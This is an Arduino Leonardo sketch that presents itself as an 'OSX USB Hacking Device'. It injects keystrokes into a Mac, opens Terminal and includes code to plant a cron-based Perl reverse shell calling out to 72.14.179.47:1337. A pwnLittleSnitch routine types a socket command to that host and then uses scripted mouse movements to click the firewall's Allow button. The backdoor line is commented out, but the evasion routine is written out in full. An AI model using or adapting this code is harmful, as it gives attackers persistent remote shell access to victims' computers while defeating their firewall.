// OSX USB Hacking Device to use with an Arduino Leonardo Board
// By Angel Diaz (https://twitter.com/angeldiazibarra)
// Inspired by Samy Kamkar's USBdriveby (https://samy.pl/usbdriveby)

#define EVIL_SERVER "xxx.com"
#define EVIL_USER "yyy"
#define EVIL_PASS "zzz"
#define LED_PIN 13

// delay ms
int ds = 500;

void setup()
{
  // give us a little time to connect up
  delay(1000);

  // allow controlling LED
  pinMode(LED_PIN, OUTPUT);

  // turn the LED on while we're pwning
  digitalWrite(LED_PIN, HIGH);

  // open spotlight, then System Preferences<return>
  // MOD ADI: changed "System Preferences" to "pref" for international users
  openapp("pref");

  // now open Terminal and open new Terminal tab
  openapp("termi");
  cmd(KEY_T);

  // if the little snitch firewall is
  // installed, let's permanently add our
  // remote host so they never get asked to
  // allow the connection since little
  // snitch allows the keyboard to control it
  //
  // if there is no little snitch, we perform
  // keystrokes that, in Terminal, will
  // cause no issues.
  
  // TO DO
  // pwnLittleSnitch();

  // add our reverse tunneling backdoor to
  // cron to run every 5 minutes

  // TO DO
  // typeln("(crontab -l ; echo \"*/5 * * * * perl -MIO::Socket -e'\\$c=new IO::Socket::INET(\\\"72.14.179.47:1337\\\");print\\$c \\`\\$_\\`while<\\$c>'\")  | crontab -");

  delay(1000);

  // then close the terminal window
  typeln("");
  typeln("exit");

  // exit terminal (if nothing is running)
  cmd(KEY_Q);

  // in case another window is running in terminal,
  // don't quit terminal in popup window by hitting ESC
  k(KEY_ESC);

  // we're done!
}


// type a string (pressing enter at the end)
// you can add extra delays so you can see what's happening
// by uncommenting the delays
void typeln(String chars)
{
  Keyboard.print(chars);
  // delay(ds);
  Keyboard.println("");
  // delay(ds * 4);
}


// open an application on OS X via spotlight/alfred
void openapp(String app)
{
  // open spotlight (or alfred/qs), then the app
  cmd(KEY_SPACE);
  typeln(app);
}


void k(int key)
{
  Keyboard.set_key1(key);
  Keyboard.send_now();
  delay(ds / 2);

  Keyboard.set_key1(0);
  Keyboard.send_now();
  delay(ds / 2);
}

void mod(int mod, int key)
{
  Keyboard.set_modifier(mod);
  Keyboard.send_now();
  Keyboard.set_key1(key);
  Keyboard.send_now();
  delay(ds);

  Keyboard.set_modifier(0);
  Keyboard.set_key1(0);
  Keyboard.send_now();
  delay(ds);
}

void ctrl(int key)
{
  mod(MODIFIERKEY_CTRL, key);
}

void cmd(int key)
{
  mod(MODIFIERKEY_GUI, key);
}

void shift(int key)
{
  mod(MODIFIERKEY_SHIFT, key);
}

void loop()
{
  // blink quickly so we know we're done
  digitalWrite(LED_PIN, HIGH);
  delay(ds / 2);
  digitalWrite(LED_PIN, LOW);
  delay(ds / 2);
}

// evade little snitch if it's installed, but don't fumble if not installed
void pwnLittleSnitch()
{
  // connect to our reverse tunneled backdoor to
  // get little snitch to open if it's installed
  typeln("perl -MIO::Socket -e'$c=new IO::Socket::INET(\"72.14.179.47:1337\")'");

  // move our keyboard using the arrow keys to allow this host permanently ;)
  k(KEY_UP);
  k(KEY_LEFT);

  // go to beginning of line if there's no little snitch (Ctrl+A)
  // since we would still be in terminal
  ctrl(KEY_A);  // go to beginning of line (Ctrl+a)
  shift(KEY_3); // add a # (shift+3)
  ctrl(KEY_C);  // ^C to exit line (Ctrl+c)

  // Here is where we submit Little Snitch with the mouse, based on what you selected above.
  // Move to top left of screen
  for (int i = 0; i < 1000; i++)
  {
    Mouse.move(-10, -10);
    delay(1);
  }

  // If we have hot corners enabled, move out and move back in
  for (int i = 0; i < 100; i++)
  {
    Mouse.move(1, 1);
    delay(5);
  }
  delay(500);

  // move to Little Snitch Allow button
  Mouse.move(100, 100);
  delay(20);
  Mouse.move(100, 100);
  delay(20);
  Mouse.move(120, -70);

  delay(1000);
  Mouse.click(); // Click click!
  delay(ds);
}
